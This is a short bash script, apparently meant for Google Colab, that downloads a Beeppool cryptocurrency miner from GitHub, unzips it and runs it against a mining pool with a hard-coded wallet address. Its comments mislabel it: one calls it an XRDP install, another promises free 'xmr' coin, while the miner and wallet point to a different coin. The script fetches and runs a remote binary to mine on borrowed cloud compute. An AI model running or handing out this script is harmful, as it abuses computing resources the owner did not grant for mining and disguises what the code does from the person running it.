#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip

unzip beepminer-0.6.1.zip

cd beepminer-0.6.1

./miner --wallet-address='NQ94 UX9H A41G MKXC 8DFM 3C06 DPYD ELBQ K04S' --pool=pool.acemining.co:8443
